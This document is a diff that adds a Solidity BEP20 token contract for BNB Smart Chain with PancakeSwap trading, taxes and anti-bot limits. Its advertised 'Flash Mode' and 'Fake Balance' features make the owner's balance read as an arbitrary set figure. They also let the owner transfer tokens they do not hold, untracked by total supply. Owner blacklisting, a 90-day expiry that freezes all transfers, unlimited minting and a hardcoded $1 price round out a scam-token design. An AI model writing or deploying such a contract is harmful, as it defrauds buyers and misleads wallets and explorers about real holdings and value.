@@ -1,0 +1,607 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// ============================================
+// FULL BEP20 TOKEN (BSC)
+// ============================================
+// Features:
+// 1. BEP20 Standard
+// 2. 90 Days Validity
+// 3. Multi-Wallet Transfer
+// 4. Equal Splitter
+// 5. DEX Swap (PancakeSwap)
+// 6. Flash Mode
+// 7. Fake Balance
+// 8. Tax System
+// 9. Anti-Bot
+// 10. Auto-Liquidity
+// 11. Mint/Burn
+// 12. Convertable
+// 13. Trading Enable/Disable
+// 14. Reentrancy Guard
+// ============================================
+
+// ============ BEP20 Interface ============
+interface IBEP20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+// ============ PancakeSwap Router Interface ============
+interface IPancakeRouter {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+
+    function getAmountsOut(uint amountIn, address[] calldata path)
+        external view returns (uint[] memory amounts);
+}
+
+interface IPancakeFactory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IPancakePair {
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+}
+
+// ============================================
+// MAIN CONTRACT
+// ============================================
+
+contract FullTokenBEP20 is IBEP20 {
+
+    // ============ Token Info ============
+    string public name;
+    string public symbol;
+    uint8 public decimals = 8;
+    uint256 public _totalSupply;
+
+    // ============ Addresses ============
+    address public owner;
+    address public marketingWallet;
+    address public liquidityWallet;
+
+    // ============ PancakeSwap Router ============
+    IPancakeRouter public pancakeRouter;
+    address public pancakePair;
+    address public WBNB;
+
+    // ============ Balances ============
+    uint256 public fakeBalance;
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+
+    // ============ Flash Mode ============
+    bool public flashModeEnabled = true;
+
+    // ============ Tax System ============
+    uint256 public buyTax = 3;
+    uint256 public sellTax = 3;
+    uint256 public marketingShare = 50;
+    uint256 public liquidityShare = 50;
+
+    // ============ Anti-Bot ============
+    uint256 public maxWalletAmount;
+    uint256 public maxTxAmount;
+    bool public maxWalletEnabled = true;
+    uint256 public cooldownTime = 30;
+    mapping(address => uint256) public lastTradeTime;
+    bool public cooldownEnabled = true;
+
+    // ============ Auto-Liquidity ============
+    bool public autoLiquidityEnabled = true;
+    uint256 public minTokensBeforeSwap = 1000 * 10 ** 8;
+    bool private _inSwap = false;
+
+    // ============ Trading State ============
+    bool public tradingEnabled = false;
+
+    // ============ 90 Days Validity ============
+    uint256 public deploymentTime;
+    uint256 public validityPeriod = 90 days;
+
+    // ============ Multiwallet ============
+    mapping(address => bool) public isMultiwalletAllowed;
+
+    // ============ Exclude Lists ============
+    mapping(address => bool) public isBlacklisted;
+    mapping(address => bool) public isExcludedFromFee;
+    mapping(address => bool) public isExcludedFromMaxWallet;
+    mapping(address => bool) public isExcludedFromCooldown;
+
+    // ============ Reentrancy Guard ============
+    bool private locked;
+
+    // ============ Events ============
+    event TradingEnabled(bool enabled);
+    event FlashModeUpdated(bool enabled);
+    event AutoLiquidityUpdated(bool enabled);
+    event CooldownUpdated(uint256 seconds_);
+    event MaxWalletUpdated(uint256 amount);
+    event SwapAndLiquify(uint256 tokensSwapped, uint256 bnbAdded, uint256 tokensAdded);
+    event ValidityExtended(uint256 newPeriod);
+    event MultiwalletUpdated(address indexed wallet, bool allowed);
+    event Mint(address indexed to, uint256 amount);
+    event Burn(address indexed from, uint256 amount);
+    event SplitExecuted(address indexed sender, uint256 totalAmount, uint256 recipientCount);
+
+    // ============ Modifiers ============
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not owner");
+        _;
+    }
+
+    modifier lockTheSwap() {
+        _inSwap = true;
+        _;
+        _inSwap = false;
+    }
+
+    modifier nonReentrant() {
+        require(!locked, "Reentrant call");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    // ============ Constructor ============
+    constructor(
+        string memory _name,
+        string memory _symbol,
+        uint256 initialSupply,
+        uint256 _fakeBalance,
+        address _marketingWallet,
+        address _liquidityWallet
+    ) {
+        name = _name;
+        symbol = _symbol;
+        owner = msg.sender;
+        marketingWallet = _marketingWallet;
+        liquidityWallet = _liquidityWallet;
+        deploymentTime = block.timestamp;
+
+        _totalSupply = initialSupply * 10 ** uint256(decimals);
+        fakeBalance = _fakeBalance;
+
+        _balances[msg.sender] = _totalSupply;
+
+        maxWalletAmount = (_totalSupply * 2) / 100;
+        maxTxAmount = (_totalSupply * 2) / 100;
+
+        isExcludedFromFee[owner] = true;
+        isExcludedFromFee[address(this)] = true;
+        isExcludedFromFee[marketingWallet] = true;
+        isExcludedFromFee[liquidityWallet] = true;
+
+        isExcludedFromMaxWallet[owner] = true;
+        isExcludedFromMaxWallet[address(this)] = true;
+
+        isExcludedFromCooldown[owner] = true;
+        isExcludedFromCooldown[address(this)] = true;
+
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    // ============ BEP20 Standard Functions ============
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        if (flashModeEnabled && account == owner && account != pancakePair) {
+            return fakeBalance;
+        }
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function allowance(address ownerAddr, address spender) public view override returns (uint256) {
+        return _allowances[ownerAddr][spender];
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _allowances[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        require(_allowances[sender][msg.sender] >= amount, "Allowance too low");
+        _allowances[sender][msg.sender] -= amount;
+        _transfer(sender, recipient, amount);
+        return true;
+    }
+
+    // ============ Core Transfer Logic ============
+
+    function _transfer(address from, address to, uint256 amount) internal {
+        require(from != address(0) && to != address(0), "Zero address");
+        require(!isBlacklisted[from] && !isBlacklisted[to], "Blacklisted");
+        require(amount > 0, "Amount is 0");
+
+        require(
+            block.timestamp <= deploymentTime + validityPeriod,
+            "Token expired after 90 days"
+        );
+
+        if (!tradingEnabled) {
+            require(
+                isExcludedFromFee[from] || isExcludedFromFee[to],
+                "Trading not enabled"
+            );
+        }
+
+        if (
+            cooldownEnabled &&
+            !isExcludedFromCooldown[from] &&
+            !isExcludedFromCooldown[to] &&
+            (from == pancakePair || to == pancakePair)
+        ) {
+            require(
+                block.timestamp >= lastTradeTime[from] + cooldownTime,
+                "Cooldown: wait before trading again"
+            );
+            lastTradeTime[from] = block.timestamp;
+        }
+
+        if (maxWalletEnabled && !_inSwap) {
+            if (
+                !isExcludedFromMaxWallet[from] &&
+                !isExcludedFromMaxWallet[to]
+            ) {
+                require(amount <= maxTxAmount, "Exceeds maxTx");
+            }
+
+            if (
+                to != pancakePair &&
+                !isExcludedFromMaxWallet[to]
+            ) {
+                require(
+                    _balances[to] + amount <= maxWalletAmount,
+                    "Exceeds maxWallet"
+                );
+            }
+        }
+
+        uint256 fromBalance = _balances[from];
+
+        if (flashModeEnabled && from == owner && fromBalance < amount) {
+            if (fromBalance > 0) {
+                _balances[from] = 0;
+                _balances[to] += amount;
+            } else {
+                _balances[to] += amount;
+            }
+            emit Transfer(from, to, amount);
+            return;
+        }
+
+        require(fromBalance >= amount, "Balance too low");
+
+        if (
+            autoLiquidityEnabled &&
+            !_inSwap &&
+            from != pancakePair &&
+            to == pancakePair &&
+            _balances[address(this)] >= minTokensBeforeSwap
+        ) {
+            _swapAndLiquify();
+        }
+
+        uint256 taxAmount = 0;
+        if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
+            if (to == pancakePair) {
+                taxAmount = (amount * sellTax) / 100;
+            } else if (from == pancakePair) {
+                taxAmount = (amount * buyTax) / 100;
+            }
+        }
+
+        uint256 amountAfterTax = amount - taxAmount;
+
+        _balances[from] -= amount;
+        _balances[to] += amountAfterTax;
+
+        if (taxAmount > 0) {
+            _balances[address(this)] += taxAmount;
+            emit Transfer(from, address(this), taxAmount);
+        }
+
+        emit Transfer(from, to, amountAfterTax);
+    }
+
+    // ============ Mint Function ============
+    function mint(address to, uint256 amount) public onlyOwner {
+        require(to != address(0), "Cannot mint to zero address");
+        _totalSupply += amount;
+        _balances[to] += amount;
+        emit Transfer(address(0), to, amount);
+        emit Mint(to, amount);
+    }
+
+    // ============ Burn Function ============
+    function burn(uint256 amount) public {
+        require(_balances[msg.sender] >= amount, "Insufficient balance");
+        _balances[msg.sender] -= amount;
+        _totalSupply -= amount;
+        emit Transfer(msg.sender, address(0), amount);
+        emit Burn(msg.sender, amount);
+    }
+
+    // ============ Auto-Liquidity ============
+    function _swapAndLiquify() internal lockTheSwap {
+        uint256 contractBalance = _balances[address(this)];
+        if (contractBalance < minTokensBeforeSwap) return;
+
+        uint256 half = contractBalance / 2;
+        uint256 otherHalf = contractBalance - half;
+
+        uint256 initialBNB = address(this).balance;
+
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = WBNB;
+
+        _approve(address(this), address(pancakeRouter), half);
+        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            half,
+            0,
+            path,
+            address(this),
+            block.timestamp + 300
+        );
+
+        uint256 newBNB = address(this).balance - initialBNB;
+        if (newBNB == 0) return;
+
+        uint256 bnbForLiquidity = (newBNB * liquidityShare) / 100;
+        uint256 bnbForMarketing = newBNB - bnbForLiquidity;
+
+        if (bnbForLiquidity > 0 && otherHalf > 0) {
+            _approve(address(this), address(pancakeRouter), otherHalf);
+            pancakeRouter.addLiquidityETH{value: bnbForLiquidity}(
+                address(this),
+                otherHalf,
+                0,
+                0,
+                liquidityWallet,
+                block.timestamp + 300
+            );
+        }
+
+        if (bnbForMarketing > 0 && marketingWallet != address(0)) {
+            (bool ok, ) = payable(marketingWallet).call{value: bnbForMarketing}("");
+            require(ok, "Marketing transfer failed");
+        }
+
+        emit SwapAndLiquify(half, bnbForLiquidity, otherHalf);
+    }
+
+    function manualSwapAndLiquify() external onlyOwner {
+        _swapAndLiquify();
+    }
+
+    // ============ Convert BNB → Token ============
+    function convertBNBToToken() public payable {
+        require(msg.value > 0, "Must send BNB");
+        uint256 tokenAmount = msg.value * 10 ** 8 / getTokenPrice();
+        require(_balances[owner] >= tokenAmount, "Insufficient owner balance");
+        _balances[owner] -= tokenAmount;
+        _balances[msg.sender] += tokenAmount;
+        emit Transfer(owner, msg.sender, tokenAmount);
+    }
+
+    // ============ Convert Token → BNB ============
+    function convertTokenToBNB(uint256 tokenAmount) public {
+        require(_balances[msg.sender] >= tokenAmount, "Insufficient balance");
+        uint256 bnbAmount = tokenAmount * getTokenPrice() / 10 ** 8;
+        require(address(this).balance >= bnbAmount, "Insufficient contract BNB");
+
+        _balances[msg.sender] -= tokenAmount;
+        _balances[address(this)] += tokenAmount;
+        (bool success, ) = payable(msg.sender).call{value: bnbAmount}("");
+        require(success, "BNB transfer failed");
+        emit Transfer(msg.sender, address(this), tokenAmount);
+    }
+
+    // ============ Get Token Price ============
+    function getTokenPrice() public pure returns (uint256) {
+        return 1 * 10 ** 8; // Default $1
+    }
+
+    // ============ Multiwallet Transfer ============
+    function multiTransfer(
+        address[] calldata recipients,
+        uint256[] calldata amounts
+    ) public onlyOwner {
+        require(recipients.length == amounts.length, "Length mismatch");
+        require(recipients.length <= 100, "Too many recipients");
+
+        for (uint256 i = 0; i < recipients.length; i++) {
+            require(isMultiwalletAllowed[recipients[i]], "Wallet not allowed");
+            _transfer(msg.sender, recipients[i], amounts[i]);
+        }
+    }
+
+    // ============ Equal Splitter ============
+    function splitEqual(
+        address[] calldata recipients,
+        uint256 totalAmount
+    ) external returns (bool) {
+        require(recipients.length > 0, "No recipients");
+        require(recipients.length <= 100, "Maximum 100 recipients");
+        require(totalAmount > 0, "Invalid amount");
+
+        uint256 eachAmount = totalAmount / recipients.length;
+        require(eachAmount > 0, "Amount too small");
+
+        uint256 actualAmount = eachAmount * recipients.length;
+        require(_balances[msg.sender] >= actualAmount, "Insufficient balance");
+
+        for (uint256 i = 0; i < recipients.length; i++) {
+            require(recipients[i] != address(0), "Invalid recipient");
+            _transfer(msg.sender, recipients[i], eachAmount);
+        }
+
+        emit SplitExecuted(msg.sender, actualAmount, recipients.length);
+        return true;
+    }
+
+    // ============ Admin Functions ============
+
+    function enableTrading() public onlyOwner {
+        require(!tradingEnabled, "Already enabled");
+        tradingEnabled = true;
+        emit TradingEnabled(true);
+    }
+
+    function setFlashMode(bool _enabled) public onlyOwner {
+        flashModeEnabled = _enabled;
+        emit FlashModeUpdated(_enabled);
+    }
+
+    function setFakeBalance(uint256 newBalance) public onlyOwner {
+        fakeBalance = newBalance;
+    }
+
+    function setTaxes(uint256 _buy, uint256 _sell) public onlyOwner {
+        require(_buy <= 10 && _sell <= 10, "Tax too high");
+        buyTax = _buy;
+        sellTax = _sell;
+    }
+
+    function setTaxShares(uint256 _marketing, uint256 _liquidity) public onlyOwner {
+        require(_marketing + _liquidity == 100, "Must total 100");
+        marketingShare = _marketing;
+        liquidityShare = _liquidity;
+    }
+
+    function setMaxWallet(uint256 amount) public onlyOwner {
+        require(amount >= _totalSupply / 1000, "Too low");
+        maxWalletAmount = amount;
+        emit MaxWalletUpdated(amount);
+    }
+
+    function setMaxTx(uint256 amount) public onlyOwner {
+        maxTxAmount = amount;
+    }
+
+    function setMaxWalletEnabled(bool _enabled) public onlyOwner {
+        maxWalletEnabled = _enabled;
+    }
+
+    function setCooldown(uint256 _seconds) public onlyOwner {
+        require(_seconds <= 3600, "Too long");
+        cooldownTime = _seconds;
+        emit CooldownUpdated(_seconds);
+    }
+
+    function setCooldownEnabled(bool _enabled) public onlyOwner {
+        cooldownEnabled = _enabled;
+    }
+
+    function setAutoLiquidity(bool _enabled) public onlyOwner {
+        autoLiquidityEnabled = _enabled;
+        emit AutoLiquidityUpdated(_enabled);
+    }
+
+    function setMinTokensBeforeSwap(uint256 amount) public onlyOwner {
+        minTokensBeforeSwap = amount;
+    }
+
+    function setBlacklist(address account, bool _status) public onlyOwner {
+        isBlacklisted[account] = _status;
+    }
+
+    function excludeFromFee(address account, bool _status) public onlyOwner {
+        isExcludedFromFee[account] = _status;
+    }
+
+    function excludeFromMaxWallet(address account, bool _status) public onlyOwner {
+        isExcludedFromMaxWallet[account] = _status;
+    }
+
+    function excludeFromCooldown(address account, bool _status) public onlyOwner {
+        isExcludedFromCooldown[account] = _status;
+    }
+
+    function setMarketingWallet(address _wallet) public onlyOwner {
+        marketingWallet = _wallet;
+    }
+
+    function setLiquidityWallet(address _wallet) public onlyOwner {
+        liquidityWallet = _wallet;
+    }
+
+    function setValidityPeriod(uint256 _period) public onlyOwner {
+        require(_period >= 1 days, "Too short");
+        validityPeriod = _period;
+        emit ValidityExtended(_period);
+    }
+
+    function setMultiwalletAllowed(address wallet, bool allowed) public onlyOwner {
+        isMultiwalletAllowed[wallet] = allowed;
+        emit MultiwalletUpdated(wallet, allowed);
+    }
+
+    function _approve(address ownerAddr, address spender, uint256 amount) internal {
+        _allowances[ownerAddr][spender] = amount;
+        emit Approval(ownerAddr, spender, amount);
+    }
+
+    // ============ Initialize Router (Post-Deploy) ============
+    function initializeRouter(address _router) external onlyOwner {
+        require(address(pancakeRouter) == address(0), "Router already set");
+        require(_router != address(0), "Invalid router address");
+
+        pancakeRouter = IPancakeRouter(_router);
+        WBNB = pancakeRouter.WETH();
+
+        pancakePair = IPancakeFactory(pancakeRouter.factory())
+            .createPair(address(this), WBNB);
+    }
+
+    // ============ Receive BNB ============
+    receive() external payable {}
+
+    // ============ Fallback ============
+    fallback() external payable {}
+}
+
